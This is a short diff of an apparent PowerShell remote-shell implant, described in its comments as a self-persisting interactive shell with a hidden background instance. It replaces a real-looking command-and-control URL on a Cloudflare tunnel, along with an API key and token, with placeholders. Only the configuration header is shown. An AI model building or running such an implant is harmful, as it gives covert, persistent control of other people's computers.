@@ -2,9 +2,9 @@
 # True interactive shell via Windows Pseudo Console
 # Self-persisting + Background PTY via Runspace
 
-$C2_URL = "https://amanda-became-courage-networks.trycloudflare.com"
-$API_KEY = "c2a8106836aef9d2debb0ba0bf562ab7"
-$TOKEN = "dd6b24af121ed7e5a500c34c4450487f"
+$C2_URL = "https://CHANGE-MECHANGE-ME.trycloudflare.com"
+$API_KEY = "00000000000000000000000000000000"
+$TOKEN = "00000000000000000000000000000000"
 
 # Check if we're the hidden instance
 if ($env:_AGENT_HIDDEN -ne "1") {
